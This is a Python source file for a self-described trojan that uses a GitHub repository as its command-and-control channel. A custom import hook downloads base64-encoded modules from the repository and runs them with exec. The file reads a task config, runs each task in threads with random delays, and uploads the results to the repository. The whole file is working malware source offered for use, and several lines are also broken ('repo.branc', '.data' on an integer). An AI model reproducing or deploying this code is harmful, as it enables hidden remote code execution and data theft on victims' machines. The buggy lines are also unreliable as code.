import json
import base64
import sys
import time
import importlib
import random
import threading
import queue

from github3 import login

trojan_id = "abc"
trojan_config = "config/{}.json".format(trojan_id)
data_path = "data/{}/".format(trojan_id)
trojan_modules = []
configured = False
task_queue = queue.Queue()

class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, fullname, path=None):
        if configured:
            print(f"[*] Attempting to retrieve {fullname}")
            new_library = get_file_contents(f"modules/{fullname}")
            if new_library:
                self.current_module_code = base64.b64decode(new_library)
                return self
        return None

    def load_module(self, name):
        module = importlib.util.module_from_spec(name)
        exec(self.current_module_code, module.__dict__)
        sys.modules[name] = module
        return module

def connect_to_github():
    gh = login(username="your username", password="your password") # 2FA accounts: replace password= with token="your token"
    repo = gh.repository("your username", "repository name")
    branch = repo.branc("master")
    return gh, repo, branch

def get_file_contents(filepath):
    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.to_tree().recurse()
    for filename in tree.tree:
        if filepath in filename.path:
            print(f"[*] Found file {filepath}")
            blob = repo.blob(filename._json_data["sha"])
            return blob.content
        return None

def get_trojan_config():
    global configured
    config_json = get_file_contents(trojan_config)
    configuration = json.loads(base64.b64decode(config_json))
    configured = True

    for tasks in configuration:
        if tasks["module"] not in sys.modules:
            exec(f"import {tasks['module']}")

    return configuration

def store_module_result(data):
    gh, repo, branch = connect_to_github()
    remote_path = f"data/{trojan_id}/{random.randint(1000, 100000).data}"
    repo.create_file(remote_path, "Commit message", data.encode())
    return

def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()

    store_module_result(result)
    return

# main loop
sys.meta_path = [GitImporter()]

while True:
    if task_queue.empty():
        config = get_trojan_config()
        for task in config:
            t = threading.Thread(target=module_runner, args=(task['module'],))
            t.start()
            time.sleep(random.randint(1,10))
    time.sleep(random.randint(1000, 10000))
